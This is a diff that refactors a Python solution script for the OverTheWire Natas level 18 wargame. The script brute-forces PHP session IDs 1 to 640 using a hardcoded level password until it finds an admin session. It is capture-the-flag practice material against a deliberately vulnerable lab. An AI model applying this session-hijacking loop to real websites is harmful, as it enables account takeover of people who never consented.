@@ -1,17 +1,20 @@
 import requests
 
-target = 'http://natas18.natas.labs.overthewire.org'
-auth = ('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
-params = dict(username='admin', password='s3cr3t')
-cookies = dict()
+# Constants
+BASE_URL = 'http://natas18.natas.labs.overthewire.org'
+BASE_USERNAME = 'natas18'
+BASE_PASSWORD = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'
+MAX_SESSION_ID = 640
+PARAMS = dict(username='admin', password='test')
 
-max_s_id = 640
-s_id = 1
-while s_id <= max_s_id:
-	print("Trying with PHPSESSID = " + str(s_id))
-	cookies = dict(PHPSESSID=str(s_id))
-	r = requests.get(target, auth=auth, params=params, cookies=cookies)
-	if "You are an admin" in r.text:
-		print(r.text)
-		break
-	s_id += 1
+# Brute-forcing session ids
+for s_id in range(1, MAX_SESSION_ID + 1):
+    print(f"Trying with PHPSESSID = {s_id}")
+    cookies = dict(PHPSESSID=str(s_id))
+    response = requests.get(BASE_URL, auth=(BASE_USERNAME, BASE_PASSWORD), params=PARAMS, cookies=cookies)
+
+    if "You are an admin" in response.text:
+        print(response.text)
+        break
+
+print("Finished brute-forcing.")
